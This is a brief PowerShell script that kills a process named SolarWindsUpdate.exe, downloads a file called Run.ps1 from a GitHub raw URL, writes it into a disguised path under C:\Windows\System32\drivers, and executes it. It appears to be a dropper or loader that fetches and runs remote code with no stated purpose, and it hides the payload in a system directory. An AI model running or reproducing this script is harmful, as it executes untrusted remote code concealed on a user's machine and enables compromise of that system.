Stop-Process -processname SolarWindsUpdate.exe

# Download Instructions
$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Run.ps1"
$output2 = "C:\Windows\System32\drivers\en-US\etc\Run.ps1"
Import-Module BitsTransfer
Start-BitsTransfer -Source $url2 -Destination $output2

Start-Process $output2
